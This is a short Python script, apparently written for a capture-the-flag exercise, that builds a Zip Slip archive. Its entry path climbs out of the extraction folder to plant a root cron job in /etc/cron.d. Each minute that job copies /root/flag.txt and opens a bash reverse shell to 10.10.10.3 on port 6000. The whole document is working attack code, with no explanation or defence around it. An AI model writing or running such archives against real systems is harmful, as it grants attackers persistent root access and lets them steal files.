import zipfile

# Content for the malicious cronjob, now including a reverse shell to 10.10.10.3:6000
cron_content = '* * * * * root /bin/bash -c "cat /root/flag.txt > /tmp/flag.txt; bash -i >& /dev/tcp/10.10.10.3/6000 0>&1"\n'

# Path inside the ZIP to trigger Zip Slip
zip_internal_path = '../../../etc/cron.d/crontab_job'

# Create the ZIP file
with zipfile.ZipFile('shell.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
    zipf.writestr(zip_internal_path, cron_content)

print("Created zip with reverse shell cronjob at", zip_internal_path)

